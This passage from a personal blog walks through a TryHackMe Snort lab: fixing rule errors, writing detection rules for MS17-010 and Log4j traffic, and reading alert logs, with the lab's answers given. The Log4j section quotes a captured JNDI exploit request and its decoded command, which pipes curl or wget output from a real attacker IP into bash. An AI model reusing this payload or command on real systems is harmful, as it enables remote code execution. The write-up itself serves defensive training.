+alert tcp any 80,443 -&gt; any any (msg: &quot;HTTPX Packet Found&quot;; sid:1000001; rev:1;)
+</code></pre>
+<h4 id="answer-22">Answer</h4>
+<blockquote>
+<p class="answer blur">90 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-5-2">Question 5</h4>
+<p>Fix the syntax error in local-4.rules file and make it work smoothly.</p>
+<p>What is the number of the detected packets?</p>
+<h5 id="notes-16">Notes</h5>
+<p>The rule defined in <code>local-5.rules</code> is;</p>
+<pre><code class="language-bash">alert icmp any any &lt;&gt; any any (msg: &quot;ICMP Packet Found&quot;; sid:1000001; rev:1;)
+alert icmp any any &lt;- any any (msg: &quot;Inbound ICMP Packet Found&quot;; sid;1000002; rev:1;)
+alert tcp any any -&gt; any 80,443 (msg: &quot;HTTPX Packet Found&quot;: sid:1000003; rev:1;)
+</code></pre>
+<p>Running snort with the provided command gives the following error;</p>
+<pre><code class="language-bash">Initializing rule chains...
+ERROR: local-5.rules(9) Illegal direction specifier: &lt;-
+Fatal Error, Quitting..
+</code></pre>
+<p>From the previous channel I know that snort does not have a <code>&lt;-</code> operator, since rule 2 is any ip and port in either direction is assume <code>&lt;&gt;</code> is the correct operator. There is a second problem in the second rule, the separator between the sid name and the value is a semi-colon instead of a colon. Finally a third problem in the 3rd rule, the separator between msg and sid is again a colon rather than semi-colon, the fix rule is;</p>
+<pre><code class="language-bash">alert icmp any any &lt;&gt; any any (msg: &quot;ICMP Packet Found&quot;; sid:1000001; rev:1;)
+alert icmp any any &lt;&gt; any any (msg: &quot;Inbound ICMP Packet Found&quot;; sid:1000002; rev:1;)
+alert tcp any any -&gt; any 80,443 (msg: &quot;HTTPX Packet Found&quot;; sid:1000003; rev:1;)
+</code></pre>
+<h4 id="answer-23">Answer</h4>
+<blockquote>
+<p class="answer blur">155 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-6-2">Question 6</h4>
+<p>Fix the logical error in local-6.rules file and make it work smoothly to create alerts.</p>
+<p>What is the number of the detected packets?</p>
+<h5 id="notes-17">Notes</h5>
+<p>The rule defined in <code>local-6.rules</code> is;</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 80  (msg: &quot;GET Request Found&quot;; content:&quot;|67 65 74|&quot;; sid: 100001; rev:1;)
+</code></pre>
+<p>This time there is no error, but the rule returns no alerts.</p>
+<p>The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting <code>67 65 74</code> into a hex to ascii convertor returns <code>get</code>.</p>
+<p>I didn't see the answer so used the hint.</p>
+<p class="alert alert-info">Hint: Case sensitivity matters! Use the capitals or nocase! </p>
+<p>Now the logical error is a little clearer, the content is looking for <code>get</code> but http verbs are generally uppercase <code>GET</code>.</p>
+<p>The hint explains to add the nocase or use uppercase letters in the content, so there are 2 possible rules that can be used;</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 80  (msg: &quot;GET Request Found&quot;; content:&quot;|67 65 74|&quot;; nocase; sid: 100001; rev:1;)
+</code></pre>
+<p>or</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 80  (msg: &quot;GET Request Found&quot;; content:&quot;|47 45 54|&quot;; sid: 100001; rev:1;)
+</code></pre>
+<h4 id="answer-24">Answer</h4>
+<blockquote>
+<p class="answer blur">2 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-7-1">Question 7</h4>
+<p>Fix the logical error in local-7.rules file and make it work smoothly to create alerts.</p>
+<p>What is the name of the required option:</p>
+<h5 id="notes-18">Notes</h5>
+<p>The rule defined in <code>local-7.rules</code> is;</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 80  (content:&quot;|2E 68 74 6D 6C|&quot;; sid: 100001; rev:1;)
+</code></pre>
+<p>Again there is no error, but the rule returns 9 alerts while the answer is 3 digits.</p>
+<p>The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting <code>2E 68 74 6D 6C</code> into a hex to ascii convertor returns <code>.html</code>.</p>
+<p>I didn't see the answer so used the hint.</p>
+<p class="alert alert-info">Hint: Rules without messages doesn't make sense! </p>
+<p>That is annoying, all it needs is a message.</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 80  (msg: &quot;HTML file&quot;; content:&quot;|2E 68 74 6D 6C|&quot;; sid: 100001; rev:1;)
+</code></pre>
+<h4 id="answer-25">Answer</h4>
+<blockquote>
+<p class="answer blur">msg </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="task-7-using-external-rules-ms17-010">Task 7 - Using External Rules (MS17-010)</h3>
+<p>Let's use external rules to fight against the latest threats!</p>
+<p>Use the given pcap file.</p>
+<h4 id="question-1-5">Question 1</h4>
+<p>Use the given rule file (local.rules) to investigate the ms1710 exploitation.</p>
+<p>What is the number of detected packets?</p>
+<h4 id="answer-26">Answer</h4>
+<blockquote>
+<p class="answer blur">25154 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2-5">Question 2</h4>
+<p><strong>Clear the previous log and alarm files.</strong></p>
+<p>Use local-1.rules empty file to write a new rule to detect payloads containing the &quot;\IPC$&quot; keyword.</p>
+<p>What is the number of detected packets?</p>
+<h5 id="notes-19">Notes</h5>
+<p>The backslash causes problems, so once the string has been converted to hex I had the following rule:</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any any  (msg: &quot;\IPC$&quot;; content:&quot;|5c 49 50 43 24|&quot;; sid: 100001; rev:1;)
+</code></pre>
+<h4 id="answer-27">Answer</h4>
+<blockquote>
+<p class="answer blur">12 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-3-4">Question 3</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What is the requested path?</p>
+<h5 id="notes-20">Notes</h5>
+<p>The snort log has entries like</p>
+<pre><code>^&#64;^&#64;^&#64;^&#64;^&#64;[�SMBu^&#64;^&#64;^&#64;^&#64;^X^A ^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;/K^&#64;^H�^^D�^&#64;^&#64;^&#64;^&#64;^&#64;^A^&#64;^\^&#64;^&#64;\\192.168.116.138\IPC$^&#64;????^&#64;TH_REPLACE
+</code></pre>
+<h4 id="answer-28">Answer</h4>
+<blockquote>
+<p class="answer blur">smb\192.168.116.138\IPC$ </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-4-4">Question 4</h4>
+<p>What is the CVSS v2 score of the MS17-010 vulnerability?</p>
+<h5 id="notes-21">Notes</h5>
+<p><a href="https://www.cvedetails.com/cve/CVE-2017-0144/">https://www.cvedetails.com/cve/CVE-2017-0144/</a></p>
+<h4 id="answer-29">Answer</h4>
+<blockquote>
+<p class="answer blur">9.3 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="task-8-using-external-rules-log4j">Task 8 - Using External Rules (Log4j)</h3>
+<p>Let's use external rules to fight against the latest threats!</p>
+<p>Use the given pcap file.</p>
+<h4 id="question-1-6">Question 1</h4>
+<p>Use the given rule file (local.rules) to investigate the log4j exploitation.</p>
+<p>What is the number of detected packets?</p>
+<h4 id="answer-30">Answer</h4>
+<blockquote>
+<p class="answer blur">26 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2-6">Question 2</h4>
+<p>Investigate the log/alarm files.</p>
+<p>How many rules were triggered?.</p>
+<h4 id="answer-31">Answer</h4>
+<blockquote>
+<p class="answer blur">4 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-3-5">Question 3</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What are the first six digits of the triggered rule sids?</p>
+<h4 id="answer-32">Answer</h4>
+<blockquote>
+<p class="answer blur">210037 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-4-5">Question 4</h4>
+<p>Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.</p>
+<p>What is the number of detected packets?</p>
+<h5 id="notes-22">Notes</h5>
+<p class="alert alert-info">Hint: The &quot;dsize&quot; option will help you to filter the payload size. </p>
+<p>A little more info on <a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node33.html#SECTION00467000000000000000">dsize syntax</a></p>
+<p>The rule can look like the below;</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any any (msg: &quot;Between 770 and 885 bytes&quot;; dsize:770&lt;&gt;855; sid: 100001; rev:1;)
+</code></pre>
+<p>Run snort</p>
+<pre><code class="language-bash">snort -c local-1.rules -A full -l . -r log4j.pcap
+</code></pre>
+<h4 id="answer-33">Answer</h4>
+<blockquote>
+<p class="answer blur">41 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-5-3">Question 5</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What is the name of the used encoding algorithm?</p>
+<h5 id="notes-23">Notes</h5>
+<p>Quick read of the log file and I noticed this</p>
+<blockquote>
+<p><sup>v</sup>D�c���GET /?x=${jndi:ldap://45.155.205.233:12344/Basic/Command/??????/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=} HTTP/1.1</p>
+</blockquote>
+<h4 id="answer-34">Answer</h4>
+<blockquote>
+<p class="answer blur">Base64 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-6-3">Question 6</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What is the IP ID of the corresponding packet?</p>
+<h5 id="notes-24">Notes</h5>
+<p>I don't know why this is the answer, it is one of the many entries in the alert file.</p>
+<h4 id="answer-35">Answer</h4>
+<blockquote>
+<p class="answer blur">62808 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-7-2">Question 7</h4>
+<p>Investigate the log/alarm files.</p>
+<p>Decode the encoded command.</p>
+<p>What is the attacker's command?</p>
+<h5 id="notes-25">Notes</h5>
+<p>The Base64 encoded string is part of the url in question 5 <code>KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=</code> it just needs decoding.</p>
+<h4 id="answer-36">Answer</h4>
+<blockquote>
+<p class="answer blur">(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-8">Question 8</h4>
+<p>What is the CVSS v2 score of the Log4j vulnerability?</p>
+<h5 id="notes-26">Notes</h5>
+<p><a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228">NIST cve-2021-44228</a></p>
+<h4 id="answer-37">Answer</h4>
+<blockquote>
+<p>9.3</p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="conclusion">Conclusion</h3>
+<p>Congratulations! Are you brave enough to stop a live attack in the <a href="https://tryhackme.com/room/snortchallenges2">Snort2 Challenge 2</a> room?</p>
+<p>Check back soon for my write up of Snort Challenge 2.</p>
+
+
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=/posts/2023-06-02-tryhackme-snort-challenges-1&t=" target="_blank" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(document.URL) + '&t=' + encodeURIComponent(document.URL)); return false;"><i class="fab fa-facebook-square fa-2x" aria-hidden="true"></i><span class="sr-only">Share on Facebook</span></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=/posts/2023-06-02-tryhackme-snort-challenges-1&text=:%20@Model.String(BlogKeys.Title)&via=mark__burton" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(document.title) + ':%20' + encodeURIComponent(document.URL)); return false;"><i class="fab fa-twitter-square fa-2x" aria-hidden="true"></i><span class="sr-only">Tweet</span></a></li>
+  <li><a href="http://pinterest.com/pin/create/button/?url=/posts/2023-06-02-tryhackme-snort-challenges-1&description=" target="_blank" title="Pin it" onclick="window.open('http://pinterest.com/pin/create/button/?url=' + encodeURIComponent(document.URL) + '&description=' +  encodeURIComponent(document.title)); return false;"><i class="fab fa-pinterest-square fa-2x" aria-hidden="true"></i><span class="sr-only">Pin it</span></a></li>
+  <li><a href="http://www.reddit.com/submit?url=/posts/2023-06-02-tryhackme-snort-challenges-1&title=" target="_blank" title="Submit to Reddit" onclick="window.open('http://www.reddit.com/submit?url=' + encodeURIComponent(document.URL) + '&title=' +  encodeURIComponent(document.title)); return false;"><i class="fab fa-reddit-square fa-2x" aria-hidden="true"></i><span class="sr-only">Submit to Reddit</span></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=/posts/2023-06-02-tryhackme-snort-challenges-1&title=&summary=&source=https://blog.mark-burton.com/posts/2023-06-02-tryhackme-snort-challenges-1" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(document.URL) + '&title=' +  encodeURIComponent(document.title)); return false;"><i class="fab fa-linkedin fa-2x" aria-hidden="true"></i><span class="sr-only">Share on LinkedIn</span></a></li>
+  <li><a href="mailto:?subject=&body=:%20@Context.GetLink(Model)" target="_blank" title="Send email" onclick="window.open('mailto:?subject=' + encodeURIComponent(document.title) + '&body=' +  encodeURIComponent(document.URL)); return false;"><i class="fas fa-envelope-square fa-2x" aria-hidden="true"></i><span class="sr-only">Send email</span></a></li>
+</ul>
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_identifier = '2023-06-02-tryhackme-snort-challenges-1';
+    var disqus_title = 'Try Hack Me - Snort Challenges - The Basics';
+    var disqus_url = 'https://blog.mark-burton.com/posts/2023-06-02-tryhackme-snort-challenges-1';
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+
+var disqus_config = function () {
+this.page.url = disqus_url;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = disqus_identifier; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+this.page.title = disqus_title;
+};
+
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//blog-mark-burton-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<script id="dsq-count-scr" src="//blog-mark-burton-com.disqus.com/count.js" async></script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                      </div>
+    </div>
+  </div>
+
+  <hr>
+
+  <!-- Footer -->  
+  <div class="container">
+        <div class="row">
+                <div class="col-md-12 text-center">
+                    <ul class="list-inline text-center small">
+                        <li class="list-inline-item copyright text-muted m-0">Copyright © 2023</li>                          
+                        <li class="list-inline-item">
+                        <a href="https://twitter.com/mark__burton" aria-label="Twitter">
+                            <i class="fab fa-twitter"> Twitter</i>
+                        </a>
+                        </li>
+                        <li class="list-inline-item">
+                        <a href="https://github.com/MarkZither" aria-label="GitHub">
+                            <i class="fab fa-github"> GitHub</i>
+                        </a>
+                        </li>
+                        <li class="list-inline-item">
+                        <a href="https://www.linkedin.com/in/mark-burton-3100074/" aria-label="LinkedIn">
+                            <i class="fab fa-linkedin"> LinkedIn</i>
+                        </a>
+                        </li>
+                            <li class="list-inline-item">
+                                <a href="/feed.rss"><i class="fas fa-rss"></i> RSS Feed</a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="/feed.atom"><i class="fas fa-rss"></i> Atom Feed</a>
+                            </li>
+                    </ul>
+                    <br />
+                    <div class="font-weight-bold small"><a href="https://statiq.dev">Generated by Statiq</a></div>
+                </div>
+        </div>
+</div>
+<!-- Piwik -->
+<script type="text/javascript">
+  var _paq = _paq || [];
+  _paq.push(["setDomains", ["*.blog.mark-burton.com"]]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//tracking.noknok.pl/";
+    _paq.push(['setTrackerUrl', u+'piwik.php']);
+    _paq.push(['setSiteId', '4']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<noscript><p><img src="//tracking.noknok.pl/piwik.php?idsite=4" style="border:0;" alt="" /></p></noscript>
+<!-- End Piwik Code -->
+
+
+  <script src="/assets/js/modernizr.3.5.0.custom.js"></script>
+<script src="https://unpkg.com/lunr@1.0.0/lunr.js"></script>
+<script src="/assets/js/lunr.unicodeNormalizer.js"></script>
+<script src="/assets/js/searchindex.js"></script>
+<script src="/assets/js/d3.v3.min.js"></script>
+<script src="/assets/js/trianglify.min.js"></script>
+<script src="/assets/js/Please-compressed.js"></script>
+<script src="/assets/js/background-check.min.js"></script>
+<script src="/assets/js/pizzamenu.js"></script>
+<script src="/assets/js/thm-walkthrough.js"></script>
+
+
+
+  
+
+  <!-- Custom scripts for this template -->
+  <script src="/js/clean-blog.js"></script>
+
+</body>
+
+</html>
